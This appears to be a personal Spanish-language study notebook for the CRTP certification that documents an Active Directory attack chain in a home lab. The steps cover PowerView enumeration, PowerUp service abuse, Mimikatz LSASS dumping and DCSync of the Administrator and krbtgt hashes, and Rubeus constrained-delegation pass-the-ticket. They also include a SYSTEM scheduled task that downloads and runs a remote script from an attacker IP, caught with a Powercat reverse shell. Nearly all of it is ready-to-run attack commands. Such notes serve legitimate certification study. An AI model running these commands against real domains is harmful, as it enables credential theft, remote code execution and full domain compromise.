# Lab Casero 

Tags: #CRTP 

## Temas a estudiar?

```bash 
# Temas
- Bypass AMSI  
- Enumeración con Powershell y BloodHound
- Elevación de Privilegios
- Constrained and Unconstrained Delegation
- Pass The Ticket (PTT)
- MSSQL Linked
- ACL / ACE
- Abuse Trust (Confianza) entre dominios

# Tools 
- Rubeus
- Mimikatz
- Powershell
```

---
## Enumeración máquina inicial 

```powershell 
--- Comandos básicos  ---
# Soy student1
❯ whoami 
❯ net localgroup Administrators 
# Quien pertenece al grupo administradores 

---  Enumeración PowerView  ---
NOTA: Siempre hacer un Bypass AMSI 
	  
❯ Get-NetComputer | Select-Object name, operatingsystem, operatingsystemversion, dnshostname
# Enumera computadoras del dominio mostrando nombre, OS, versión del OS y hostname DNS.

❯ Get-NetUser | Select-Object samaccountname, name, description, memberof, lastlogon, pwdlastset, badpwdcount | Format-Table -AutoSize
# Enumera usuarios del dominio mostrando cuenta, nombre, descripción, grupos, último logon, último cambio de contraseña y contador de intentos fallidos.

# Grupos privilegiados y sus miembros: 'Domain admins, Administrators, Enterprise Admins, Operators'
❯ Get-DomainGroupMember -Identity "Domain Admins" | Select-Object GroupName, MemberName, MemberDomain, IsGroup | Format-Table -AutoSize
# Enumera los miembros del grupo "Domain Admins" mostrando nombre del grupo, miembro, dominio e indicador si el miembro es un grupo anidado.
 
❯ Get-NetDomainTrust | Select-Object SourceName, TargetName, TrustType, TrustDirection, TrustAttributes | Format-Table -AutoSize
# Enumera las relaciones de confianza del dominio actual mostrando origen, destino, tipo, dirección y atributos del trust — útil para identificar rutas de movimiento lateral entre dominios.

# Constrained y unconstrained delegation 
❯ Get-NetComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto | Format-List
# Enumera computadoras con delegación Kerberos no restringida (Constrained Delegation), mostrando nombre y los SPNs a los que pueden delegar. Ejemplos: Cifs

# DCSync users 
❯ Get-DomainObjectAcl -SearchBase "DC=enterprise,DC=com" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "DS-Replication-Get-Changes-All" } | Select-Object ObjectAceType, @{Name='Identidad'; Expression={Convert-SidToName $_.SecurityIdentifier}} | Format-Table -AutoSize
# Busca ACEs con el permiso DS-Replication-Get-Changes-All en el dominio, resolviendo el SID al nombre de la cuenta — identifica candidatos para DCSync.
``` 

## PrivEsc máquina inicial 

```powershell 
# PowerUp
❯ Invoke-AllChecks
# Ejecuta todos los checks de escalación de privilegios locales de PowerSploit/PowerUp. Identifica servicios con rutas sin comillas (Unquoted Service Path), servicios cuya configuración puede ser modificada por el usuario actual (weak service permissions), binarios de servicios reemplazables, tareas programadas mal configuradas, entre otros vectores comunes de privesc en Windows.

# Servicios clave para escalar 
1 AbyssWebServer con Check: 'Unquoted service paths' 
2 AbyssWebServer con Check: 'Modifiable Service Files' y CanRestart: 'True'
3 StartName: LocalSystem 
4 ModifiableFileIdentityReference: Everyone 

---  Hacer el abuso  ---
❯ Invoke-ServiceAbuse -Name AbyssWebServer -Username 'dominio\usuario'
# Abusa de un servicio con permisos débiles para agregar un usuario al grupo local de administradores. Modifica el binPath del servicio para ejecutar un comando arbitrario como SYSTEM.

❯ net localgroup Administrators   # Verificar que hemos sido agregado al grupo Administrators 

NOTA: Requiere cerrar sesión y volver a autenticarse para que sean asignados los nuevos permisos en memoria  
```

## Enum con Privs máquina inicial 

```powershell 
# Mimikatz 
❯ .\mimikatz.exe        # Forma separada 
	privilege::debug 
	sekurlsa::logonpasswords 

❯ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit      # El mismo comando en una sola línea 
# Habilitar SeDebugPrivilege y extraer credenciales/hashes NTLM de sesiones activas en LSASS
```

## Constrained Delegation Abuse 

```powershell
# Constrained Delegation: Se puede generar un ticket en el otro server de cualquier usuario pero solo para servicios específicos 

❯ .\Rubeus.exe s4u /user:SERVER2$ /domain:domain.com /rc4:NTLM /impersonateuser:Administrator /msdsspn:"cifs/DATABASE.domain.com" /ptt 
# Abusa de Constrained Delegation (S4U2Self + S4U2Proxy) permitiendo crear tickets forwardeables usando el hash NTLM de SERVER2$ para impersonar al Administrator y obtener un ticket de servicio (ST) para CIFS del objetivo — permite acceso tipo DA al recurso delegado y el flag /ptt (Pass-the-Ticket) que inyecta el ticket resultante directamente en la sesión actual — no requiere exportar el .kirbi manualmente

NOTA: DATABASE es el nombre de otro server
 
❯ dir \\DATABASE.domain.com\c$        
# Verificar el ingreso al directorio DATABASE

❯ .\Rubeus.exe s4u /user:SERVER2$ /domain:domain.com /rc4:NTLM /impersonateuser:Administrator /msdsspn:"cifs/DATABASE.domain.com" /altservice:HOST /ptt
# Mismo ataque S4U pero con /altservice:HOST que reescribe el SPN del ticket a HOST — permite ejecutar comandos remotos vía WMI/PSRemoting en lugar de solo acceso a recursos CIFS. Vía psexec o scheduled task 


---  Scheduled Task  ---
❯ schtasks /query /S DATABASE.domain.com /FO CSV /V | ConvertFrom-Csv | Where-Object { $_.Author -notlike "*Microsoft*" } | Select-Object TaskName, Author, "Task To Run"
# Enumerar tareas programadas en un equipo remoto quitando las de Microsoft, útil para identificar tareas personalizadas potencialmente abusables para persistencia o privesc.

❯ schtasks /create /S DATABASE.domain.com /SC Weekly /RU SYSTEM /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.5.102/powershelloneline.ps1'')'"
# Crear una tarea llamada 'STCheck' programada semanal en el equipo remoto que se ejecuta como SYSTEM, la cual descarga y ejecuta un script PS1 desde la IP del atacante (cradle). Útil para persistencia o ejecución de código remoto.

# Recibir la revershell en Windows 
❯ Import-Module .\Powercat.ps1 
❯ powercat -lpv 443

❯ schtasks /Run /S DATABASE.enterprise.com /TN "STCheck"
# Ejecutar de forma inmediata una tarea programada existente en el equipo remoto, útil para disparar el payload sin esperar al trigger programado.

NOTA: El scheduled task te permite acceder como NT Authority\System 
```

---
## Server 1 (DATABASE) 

```powershell 
# Despues de tener la Revershell 
❯ hostname 
❯ whoami
❯ net localgroup Administrators domain\student1 /add    
# Agregar el usuario 'student1' del server inicial a este server como integrante del grupo Administrators 

❯ net localgroup Administrators student1 /domain /add      # Otra forma de hacerlo 
```

```powershell 
# Una vez agregado al grupo Administrators se hace esto desde el server inicial para poder ingresar por WinRM al server DATABASE
❯ $password = ConvertTo-SecureString "Password12345" -AsPlainText -Force
# Convertir una contraseña en texto claro a un objeto SecureString. Es un previo para construir un PSCredential y ejecutar comandos en contexto de otro usuario

❯ $cred = New-Object System.Management.Automation.PSCredential("domain\student1", $password)
# Crea un objeto PSCredential combinando usuario y SecureString, se usa como -Credential en cmdlets como Invoke-Command, Enter-PSSession o New-PSSession para ejecutar en contexto de otro usuario

❯ $sess = New-PSSession -ComputerName database.domain.com -Credential $cred
# Establece una sesión remota de PowerShell (WinRM) hacia el equipo objetivo usando las credenciales del PSCredential — base para ejecutar comandos remotos con Invoke-Command o Enter-PSSession

❯ Enter-PSSession -Session $sess
# Entrar de forma interactiva a la sesión remota de PowerShell previamente establecida, equivalente a una shell remota sobre WinRM 
```

---
## Enum ACL - Server inicial 

```powershell 
# Usar BloodHound desde el server inicial para mirar los ACL 
❯ Import-Module .\SharpHound.ps1 
❯ Invoke-BloodHound -c All 

NOTA: Como el server inicial tiene el usuario que ya es parte del dominio, se puede hacer la recolección de el mismo 

# En BloodHound 
1 Seleccionar 'Find Shortest Paths to Domain Admins'
```

```powershell 
# Se encontró que la ACL del usuario Student1 tiene DCSync

# Mimikatz 
❯ .\mimikatz.exe        # Forma separada 
	lsadump::dcsync /domain:domain.com /user:Administrator      # Obtener el hash NTLM
	lsadump::dcsync /domain:domain.com /user:krbtgt 

❯ .\mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" exit      # El mismo comando en una sola línea 
# Habilitar SeDebugPrivilege y extraer credenciales/hashes NTLM de sesiones activas en LSASS
```

```powershell 
❯ .\Rubeus.exe asktgt /user:Administrator /rc4:NTLM /domain:enterprise.com /dc:WIN-DC.domain.com /ptt
# Solicita un TGT para Administrator usando su hash NTLM e inyecta el ticket directamente en la sesión actual (/ptt), permite acceso inmediato a recursos del dominio (DC) sin necesidad de exportar el .kirbi.
# WIN-DC es la máquina del DC

❯ klist

❯ dir \\WIN-DC\C$     
# Verificar el ingreso al directorio del DC
```